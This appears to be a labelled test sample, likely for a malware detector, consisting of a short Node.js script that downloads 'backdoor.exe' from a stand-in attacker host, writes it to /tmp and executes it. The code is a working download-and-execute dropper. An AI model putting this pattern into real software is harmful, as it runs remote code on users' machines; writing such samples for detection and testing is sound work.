// Malware Sample 3: File Download and Execute
// Pattern: HTTP download -> fs.writeFile -> exec
const http = require('http');
const fs = require('fs');
const { exec } = require('child_process');

const malwareUrl = 'http://attacker.com/backdoor.exe';
const localPath = '/tmp/malware.exe';

http.get(malwareUrl, (response) => {
    const fileStream = fs.createWriteStream(localPath);

    response.pipe(fileStream);

    fileStream.on('finish', () => {
        fileStream.close();

        // Dangerous: Executes downloaded file
        exec(localPath, (error, stdout) => {
            console.log('Payload executed');
        });
    });
});
